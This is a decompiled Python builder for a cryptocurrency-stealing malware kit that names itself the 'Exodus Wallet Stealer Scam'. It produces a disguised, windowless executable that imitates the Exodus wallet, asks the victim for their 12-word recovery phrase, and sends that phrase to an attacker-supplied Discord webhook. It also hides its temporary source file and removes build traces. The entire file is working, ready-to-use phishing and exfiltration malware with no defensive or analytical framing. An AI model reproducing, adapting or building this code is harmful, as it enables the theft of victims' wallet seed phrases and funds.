# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'fake_exodus.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import subprocess
import shutil
import random
import string
import time
import hashlib
from colorama import init, Fore
init(autoreset=True)
RED = Fore.RED
class ExodusBuilder:
    def __init__(self):
        self.webhook_url = None
        self.output_name = 'Exodus.exe'
    def get_user_input(self):
        banner = '\n ________                            __                     \n|        \\                          |  \\                    \n| $$$$$$$$ __    __   ______    ____| $$ __    __   _______ \n| $$__    |  \\  /  \\ /      \\  /      $$|  \\  |  \\ /       \\\n| $$  \\    \\$$\\/  $$|  $$$$$$\\|  $$$$$$$| $$  | $$|  $$$$$$$\n| $$$$$     >$$  $$ | $$  | $$| $$  | $$| $$  | $$ \\$$    \\ \n| $$_____  /  $$$$\\ | $$__/ $$| $$__| $$| $$__/ $$ _\\$$$$$$\\\n| $$     \\|  $$ \\$$\\ \\$$    $$ \\$$    $$ \\$$    $$|       $$\n \\$$$$$$$$ \\$$   \\$$  \\$$$$$$   \\$$$$$$$  \\$$$$$$  \\$$$$$$$ \n                                                            \n                                                            \n                                                                                                                                                       \n                                                                                                            \n        '
        print(RED + banner)
        print(RED + '[+] ============================== Exodus Wallet Stealer Scam ==============================\n')
        print(RED + '[+] Craft Your Attack: Set [Discord Webhook], [Custom EXE Name]')
        print(RED + '[+] Builds stealth .exe, hides console, no traces left behind')
        print(RED + '[+] Fake Exodus wallet GUI – tricks victim into entering 12-word seed phrase')
        print(RED + '[+] Steals full secret recovery phrase and sends it directly to your webhook')
        print(RED + '[+] Animated arrow + clickable lines for maximum credibility')
        print(RED + '[+] Custom icon & background from \'input\' folder – perfect social engineering')
        print(RED + '[+] Victim thinks it\'s real Exodus – your wallet gets drained instantly\n')
        print(RED + '[+] =========================================================================================\n')
        self.webhook_url = input(RED + 'Enter Discord Webhook URL: ').strip()
        if not self.webhook_url:
            print(RED + '[-] ERROR: Webhook URL is required')
            sys.exit(1)
        custom_name = input(RED + 'Enter output filename (default: Exodus.exe): ').strip()
        if custom_name:
            if not custom_name.lower().endswith('.exe'):
                custom_name += '.exe'
            self.output_name = custom_name
    def build_exodus(self):
        output_folder = os.path.join(os.getcwd(), 'output')
        os.makedirs(output_folder, exist_ok=True)
        temp_file = os.path.join(output_folder, f'.Exodus_Source_{random.randint(1000, 9999)}.py')
        output_exe = os.path.join(output_folder, self.output_name)
        bg_input_path = os.path.join(os.getcwd(), 'input', 'background.png')
        if not os.path.exists(bg_input_path):
            print(RED + '[-] ERROR: background.png not found in input folder')
            sys.exit(1)
        icon_path = os.path.join(os.getcwd(), 'input', 'icon.ico')
        if not os.path.exists(icon_path):
            print(RED + '[-] WARNING: icon.ico not found – compiling without icon')
            icon_option = []
        else:
            print(RED + f'[+] Icon found: {icon_path}')
            icon_option = [f'--icon={icon_path}']
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(f'''import tkinter as tk
import customtkinter as ctk
from PIL import Image, ImageTk
import os
import sys
import ctypes
import requests

WEBHOOK_URL = "{self.webhook_url}"

# -------------------------
# COULEURS
# -------------------------
ENTRY_BG = "#27254A"
TRAIT_COLOR = "#BBBBBB"
TEXT_COLOR = "white"

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

BG_PATH = resource_path("background.png")

ctk.set_appearance_mode("System")
ctk.set_default_color_theme("blue")

root = ctk.CTk()
root.title("Exodus")
root.geometry("800x600")
root.resizable(False, False)

# -------------------------
# FENÊTRE SANS BORDURE
# -------------------------
root.overrideredirect(True)
root.update_idletasks()
hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
style |= 0x00040000
style &= ~0x00000080
ctypes.windll.user32.SetWindowLongW(hwnd, -20, style)
root.withdraw()
root.after(10, root.deiconify)

# -------------------------
# BACKGROUND
# -------------------------
if not os.path.exists(BG_PATH):
    sys.exit()

img = Image.open(BG_PATH).resize((1000, 750), Image.Resampling.LANCZOS)
bg_photo = ImageTk.PhotoImage(img)
tk.Label(root, image=bg_photo).place(x=0, y=0, relwidth=1, relheight=1)

# -------------------------
# POSITIONS
# -------------------------
entry_positions = [
    (175, 305), (266, 305), (354, 305), (443, 305), (533, 305), (622, 305),
    (175, 365), (266, 365), (354, 365), (443, 365), (533, 365), (622, 365),
]

trait_positions = [
    (169, 406), (282, 406), (393, 406), (505, 406), (617, 406), (729, 406),
    (169, 481), (282, 481), (393, 481), (505, 481), (617, 481), (729, 481),
]

# -------------------------
# ENTRIES
# -------------------------
entries = {{}}
entry_values = {{}}

def activate_entry(idx):
    if idx in entries:
        entries[idx].focus()
        return

    x, y = entry_positions[idx]

    entry = ctk.CTkEntry(
        root,
        width=80,
        height=14,
        fg_color=ENTRY_BG,
        border_width=0,
        text_color=TEXT_COLOR,
        font=("Arial", 12, "bold"),
        justify="center",
        corner_radius=0
    )
    entry.place(x=x, y=y, anchor="center")
    entries[idx] = entry
    entry_values[idx] = ""

    def on_change(event):
        entry_values[idx] = entry.get().strip()

    entry.bind("<KeyRelease>", on_change)
    entry.focus()

# -------------------------
# TRAITS
# -------------------------
for idx, (x, y) in enumerate(trait_positions):
    c = tk.Canvas(root, width=100, height=3, bg=TRAIT_COLOR, highlightthickness=0)
    c.place(x=x, y=y)
    c.bind("<Button-1>", lambda e, i=idx: activate_entry(i))
    c.bind("<Enter>", lambda e, w=c: w.configure(cursor="hand2"))
    c.bind("<Leave>", lambda e, w=c: w.configure(cursor=""))

# -------------------------
# DÉGRADÉ VIOLET DOUX ANIMÉ POUR LA FLÈCHE
# -------------------------
arrow_x = 845
arrow_y = (406 + 481) // 2

arrow_w, arrow_h = 55, 32
arrow = tk.Canvas(root, width=arrow_w, height=arrow_h, highlightthickness=0)
arrow.place(x=arrow_x, y=arrow_y, anchor="w")

gradient_offset = 0

def animate_gradient():
    arrow.delete("all")
    global gradient_offset

    start_color = (185, 167, 220)
    end_color   = (175, 152, 221)

    for i in range(arrow_w):
        t = ((i + gradient_offset) % arrow_w) / (arrow_w - 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * t)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * t)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * t)
        arrow.create_line(i, 0, i, arrow_h, fill=f"#{{r:02x}}{{g:02x}}{{b:02x}}")

    arrow.create_text(
        arrow_w // 2,
        (arrow_h // 2) - 2,
        text="→",
        fill="white",
        font=("Arial", 18, "bold")
    )

    gradient_offset = (gradient_offset + 1) % arrow_w
    root.after(80, animate_gradient)

animate_gradient()

arrow.bind("<Button-1>", lambda e: send_to_discord())
arrow.bind("<Enter>", lambda e: arrow.configure(cursor="hand2"))
arrow.bind("<Leave>", lambda e: arrow.configure(cursor=""))

# -------------------------
# MESSAGE ERREUR
# -------------------------
msg_w, msg_h = 340, 28
msg_x = 520
msg_y = 510

msg_canvas = tk.Canvas(root, width=msg_w, height=msg_h, highlightthickness=0)
msg_canvas.place_forget()

def draw_gradient(canvas, w, h, start, end):
    canvas.delete("all")
    for i in range(w):
        r = int(start[0] + (end[0] - start[0]) * i / w)
        g = int(start[1] + (end[1] - start[1]) * i / w)
        b = int(start[2] + (end[2] - start[2]) * i / w)
        canvas.create_line(i, 0, i, h, fill=f"#{{r:02x}}{{g:02x}}{{b:02x}}")

def show_error():
    draw_gradient(msg_canvas, msg_w, msg_h, (15, 15, 15), (70, 70, 70))
    msg_canvas.create_text(
        msg_w // 2,
        msg_h // 2,
        text="Your secret phrase is incomplete",
        fill="white",
        font=("Arial", 11, "bold")
    )
    msg_canvas.place(x=msg_x, y=msg_y, anchor="center")

def hide_error():
    msg_canvas.place_forget()

# -------------------------
# ENVOI WEBHOOK
# -------------------------
def send_to_discord():
    if len(entry_values) != 12 or any(v == "" for v in entry_values.values()):
        show_error()
        return

    hide_error()

    phrase = "-".join(entry_values[i] for i in range(12))
    payload = {{"content": f"**Secret Phrase:** {{phrase}}"}}

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

# -------------------------
# EXIT
# -------------------------
root.bind("<Escape>", lambda e: root.destroy())
root.mainloop()
''')
        try:
            subprocess.run(['attrib', '+H', '+S', str(temp_file)], check=False, shell=True)
            print(RED + '[+] Temporary source file hidden and marked as system.')
        except Exception as e:
            print(RED + f'[*] Warning: Could not set attributes for temp file: {str(e)}')
        if not os.path.exists(temp_file) or os.path.getsize(temp_file) == 0:
            print(RED + '[-] ERROR: Failed to create temporary source file')
            sys.exit(1)
        if self.webhook_url not in open(temp_file, 'r', encoding='utf-8').read():
            print(RED + '[-] ERROR: Webhook not injected correctly')
            sys.exit(1)
        print(RED + '[+] Checking for PyInstaller...')
        result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode!= 0:
            print(RED + '[-] ERROR: PyInstaller not found')
            print(RED + '[*] Install with: pip install pyinstaller')
            sys.exit(1)
        print(RED + '[*] Compiling Exodus stealer...')
        command = ['pyinstaller', '--onefile', '--noconsole', '--hidden-import=customtkinter', f'--add-data={bg_input_path};.', *icon_option, temp_file]
        print(RED + f"[+] Command: {' '.join(command)}")
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode!= 0:
            print(RED + '[-] ERROR: Compilation failed')
            print(RED + result.stderr)
            sys.exit(1)
        dist_exe = os.path.join('dist', os.path.basename(temp_file).replace('.py', '.exe'))
        if os.path.exists(dist_exe):
            if os.path.exists(output_exe):
                os.remove(output_exe)
            shutil.move(dist_exe, output_exe)
            print(RED + f'[+] Exodus compiled successfully: {output_exe}')
        else:
            print(RED + '[-] ERROR: Executable not found after compilation')
            sys.exit(1)
        try:
            os.remove(temp_file)
            spec_file = os.path.join(os.getcwd(), os.path.basename(temp_file).replace('.py', '.spec'))
            if os.path.exists(spec_file):
                os.remove(spec_file)
            shutil.rmtree('build', ignore_errors=True)
            shutil.rmtree('dist', ignore_errors=True)
            shutil.rmtree('__pycache__', ignore_errors=True)
        except:
            pass
        print(RED + '[+] Cleanup completed')
        print(RED + '[+] Press Enter to exit...')
        input()
if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    builder = ExodusBuilder()
    builder.get_user_input()
    builder.build_exodus()